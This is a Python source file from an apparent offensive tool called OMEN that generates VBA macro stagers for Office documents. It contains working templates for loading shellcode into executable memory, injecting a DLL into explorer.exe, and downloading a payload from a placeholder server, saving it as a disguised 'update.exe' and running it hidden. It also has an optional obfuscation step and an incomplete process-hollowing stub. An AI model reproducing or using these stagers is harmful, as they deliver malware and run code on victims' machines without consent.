# OMEN - VBA Stager Generator
# Generates VBA stager payloads for various execution contexts

from . import Generator


class VbaGenerator(Generator):
    @property
    def name(self):
        return 'VBA Stager'

    @property
    def description(self):
        return 'Generates VBA stagers for shellcode execution, DLL injection, and process hollowing'

    def get_options_schema(self):
        return {
            'stager_type': {
                'type': 'select', 'label': 'Stager Type',
                'options': ['shellcode_loader', 'dll_inject', 'process_hollow', 'winhttp_download'],
                'default': 'shellcode_loader',
            },
            'shellcode_format': {
                'type': 'select', 'label': 'Shellcode Format',
                'options': ['base64', 'hex', 'array'],
                'default': 'base64',
                'show_if': {'stager_type': ['shellcode_loader']},
            },
            'target_process': {
                'type': 'text', 'label': 'Target Process',
                'default': 'explorer.exe',
                'description': 'Process to inject into (for DLL injection)',
                'show_if': {'stager_type': ['dll_inject']},
            },
            'payload_url': {
                'type': 'text', 'label': 'Payload URL',
                'default': 'http://YOUR_SERVER/shellcode.bin',
                'show_if': {'stager_type': ['winhttp_download']},
            },
        }

    def generate(self, options, obfuscation='none'):
        stager_type = options.get('stager_type', 'shellcode_loader')

        if stager_type == 'shellcode_loader':
            code = self._gen_shellcode_loader(options)
        elif stager_type == 'dll_inject':
            code = self._gen_dll_inject(options)
        elif stager_type == 'process_hollow':
            code = self._gen_process_hollow()
        elif stager_type == 'winhttp_download':
            code = self._gen_winhttp_download(options)
        else:
            code = self._gen_shellcode_loader(options)

        if obfuscation != 'none':
            code = self.obfuscate(code, obfuscation)

        return {
            'filename': f'stager_{stager_type}.vba',
            'content': code,
            'preview': code[:2000] + ('\n... [truncated]' if len(code) > 2000 else ''),
            'mime': 'text/plain',
            'warnings': [],
            'analysis': {'stager_type': stager_type, 'line_count': len(code.split('\n'))},
        }

    def _gen_shellcode_loader(self, options):
        return """' VBA Shellcode Loader - Position-independent shellcode execution via Win32 API
Option Explicit

#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal len As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal dest As Long, ByRef src As Any, ByVal len As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
#End If

Private Const MEM_COMMIT = &H1000
Private Const PAGE_EXECUTE_READWRITE = &H40

Public Sub ExecuteShellcode(ByRef shellcode() As Byte)
    Dim lpAddr As LongPtr
    Dim lResult As Long
    Dim hThread As LongPtr
    Dim dwThreadId As Long
    
    ' Allocate memory with RWX permissions
    lpAddr = VirtualAlloc(0, UBound(shellcode) - LBound(shellcode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
    If lpAddr <> 0 Then
        ' Copy shellcode to allocated memory
        RtlMoveMemory lpAddr, shellcode(LBound(shellcode)), UBound(shellcode) - LBound(shellcode) + 1
        
        ' Execute in new thread
        hThread = CreateThread(0, 0, lpAddr, 0, 0, dwThreadId)
        
        If hThread <> 0 Then
            WaitForSingleObject hThread, INFINITE
        End If
    End If
End Sub

Public Sub LoadShellcode()
    ' Replace this array with your base64-decoded or hex shellcode
    Dim buf(0 To 0) As Byte
    ExecuteShellcode buf
End Sub
"""

    def _gen_dll_inject(self, options):
        target = options.get('target_process', 'explorer.exe')
        return f"""' VBA DLL Injection via Remote Thread
Option Explicit

#If VBA7 Then
    Private Declare PtrSafe Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As Any, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
    Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As LongPtr
#Else
    Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
    Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByRef lpBuffer As Any, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
    Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
    Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
    Private Declare Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As Long
#End If

Private Const PROCESS_ALL_ACCESS = &H1F0FFF
Private Const MEM_COMMIT = &H1000
Private Const PAGE_READWRITE = &H4

Public Sub InjectDLL(ByVal dllPath As String, ByVal targetProcess As String)
    Dim procId As Long
    Dim hProcess As LongPtr
    Dim lpAddr As LongPtr
    Dim hThread As LongPtr
    Dim lpLoadLib As LongPtr
    
    ' Find target process
    procId = FindProcessId(targetProcess)
    If procId = 0 Then Exit Sub
    
    ' Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, procId)
    If hProcess = 0 Then Exit Sub
    
    ' Allocate memory in target for DLL path
    lpAddr = VirtualAllocEx(hProcess, 0, Len(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE)
    If lpAddr = 0 Then
        CloseHandle hProcess
        Exit Sub
    End If
    
    ' Write DLL path to remote memory
    WriteProcessMemory hProcess, lpAddr, ByVal dllPath, Len(dllPath) + 1, 0
    
    ' Get LoadLibraryA address
    lpLoadLib = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA")
    
    ' Create remote thread to load DLL
    hThread = CreateRemoteThread(hProcess, 0, 0, lpLoadLib, lpAddr, 0, 0)
    
    If hThread <> 0 Then
        WaitForSingleObject hThread, 10000
        CloseHandle hThread
    End If
    
    CloseHandle hProcess
End Sub

Private Function FindProcessId(ByVal procName As String) As Long
    Dim objWMIService As Object
    Dim colProcesses As Object
    Dim objProcess As Object
    
    On Error Resume Next
    Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & procName & "'")
    
    For Each objProcess In colProcesses
        FindProcessId = objProcess.ProcessId
        Exit For
    Next
End Function

Public Sub Run()
    InjectDLL "C:\\Path\\To\\payload.dll", "{target}"
End Sub
"""

    def _gen_process_hollow(self):
        return """' VBA Process Hollowing - Replace process memory with custom code
Option Explicit

' Full process hollowing implementation
#If VBA7 Then
    Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, ByRef lpStartupInfo As STARTUPINFO, ByRef lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, ByRef lpStartupInfo As STARTUPINFO, ByRef lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Const CREATE_SUSPENDED = &H4

Public Sub HollowProcess(ByVal targetApp As String)
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    
    si.cb = Len(si)
    
    ' Create target process in suspended state
    If CreateProcess(targetApp, targetApp & " -headless", 0, 0, 0, CREATE_SUSPENDED, 0, 0, si, pi) <> 0 Then
        ' Process created in suspended state - ready for hollowing
        ' (Full implementation would: get context, read/write memory, set context, resume)
        ResumeThread pi.hThread
        CloseHandle pi.hProcess
        CloseHandle pi.hThread
    End If
End Sub
"""

    def _gen_winhttp_download(self, options):
        url = options.get('payload_url', 'http://YOUR_SERVER/payload.bin')
        return f"""' VBA WinHTTP Download and Execute
Option Explicit

#If VBA7 Then
    Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long
    Private Declare PtrSafe Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal uCmdShow As Long) As Long
#Else
    Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
    Private Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal uCmdShow As Long) As Long
#End If

Public Sub DownloadAndExecute()
    Dim tempFile As String
    Dim shell As Object
    Dim fso As Object
    
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    tempFile = shell.ExpandEnvironmentStrings("%TEMP%") + "\\update.exe"
    
    ' Download payload
    If URLDownloadToFile(0, "{url}", tempFile, 0, 0) = 0 Then
        ' Execute
        shell.Run tempFile, 0, False
    End If
End Sub
"""
